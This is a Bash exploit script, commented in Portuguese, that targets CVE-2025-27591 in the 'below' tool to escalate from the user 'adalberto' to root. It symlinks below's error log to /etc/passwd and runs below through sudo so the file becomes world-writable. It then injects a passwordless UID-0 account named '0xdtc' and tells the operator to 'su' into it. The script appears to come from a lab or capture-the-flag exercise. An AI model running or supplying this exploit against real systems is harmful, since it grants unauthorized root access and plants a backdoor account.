#!/bin/bash
#
# Exploit CVE-2025-27591 (below 0.8.1) para virar root a partir do usuário adalberto.
# Pré-requisitos:
#  - sudoers permitindo: adalberto ALL=(ALL) NOPASSWD: /usr/local/bin/below * (com algumas opções bloqueadas)
#  - diretório /var/log/below existente e gravável por adalberto
#
# Uso:
#  - logado como adalberto:  chmod +x cve_below_root.sh && ./cve_below_root.sh
#  - depois: su 0xdtc   (senha em branco)

set -e

LOGFILE="/var/log/below/error_root.log"
BELOW_BIN="/usr/local/bin/below"
NEW_USER="0xdtc"

echo "[*] Verificando binário do below e diretório de logs..."

if [ ! -x "$BELOW_BIN" ]; then
  echo "[!] $BELOW_BIN não encontrado ou não executável."
  exit 1
fi

if [ ! -d "/var/log/below" ]; then
  echo "[!] Diretório /var/log/below não existe. Verifique o ambiente."
  exit 1
fi

echo "[*] Estado atual de $LOGFILE (se existir):"
ls -la "$LOGFILE" 2>/dev/null || echo "  (ainda não existe)"

echo
echo "[*] Removendo log antigo (se houver)..."
rm -f "$LOGFILE"

echo "[*] Criando symlink do log para /etc/passwd..."
ln -s /etc/passwd "$LOGFILE"

echo "[*] Symlink criado:"
ls -la "$LOGFILE"

echo
echo "[*] Rodando 'sudo $BELOW_BIN record' em background (explorando CVE-2025-27591)..."
# NOPASSWD no sudoers: não deve pedir senha
sudo "$BELOW_BIN" record >/dev/null 2>&1 &

PID=$!
echo "[*] PID do below: $PID"
echo "[*] Aguardando alguns segundos para o below abrir o 'log' (que aponta para /etc/passwd)..."
sleep 5

echo "[*] Tentando encerrar o processo do below (se ainda estiver vivo)..."
if kill "$PID" >/dev/null 2>&1; then
  echo "[*] Processo $PID encerrado."
else
  echo "[*] Processo já não está rodando (ok)."
fi

echo
echo "[*] Verificando permissões de /etc/passwd após o exploit..."
ls -la /etc/passwd

MODE=$(stat -c "%a" /etc/passwd 2>/dev/null || echo "???")
echo "[*] Modo atual de /etc/passwd: $MODE"

if [ "$MODE" != "666" ] && [ "$MODE" != "6660" ] && [ "$MODE" != "6664" ]; then
  echo "[!] /etc/passwd não parece estar world-writable (esperado algo como 666)."
  echo "    Verifique manualmente se o exploit funcionou e rode novamente se necessário."
  # não vamos abortar: pode ser que o FS reporte diferente; segue adiante por sua conta e risco
fi

echo
echo "[*] Verificando se o usuário '$NEW_USER' já existe em /etc/passwd..."
if grep -q "^${NEW_USER}:" /etc/passwd; then
  echo "[*] Usuário '$NEW_USER' já existe em /etc/passwd. Não será adicionado novamente."
else
  echo "[*] Injetando usuário '$NEW_USER' com UID 0 em /etc/passwd..."
  echo "${NEW_USER}::0:0:${NEW_USER}:/root:/bin/bash" >> /etc/passwd
  echo "[*] Linha adicionada:"
  tail -n 3 /etc/passwd
fi

echo
echo "[*] Exploit concluído."
echo "[*] Agora tente virar root com:"
echo
echo "    su ${NEW_USER}"
echo
echo "[*] Quando pedir senha, apenas pressione ENTER (senha em branco)."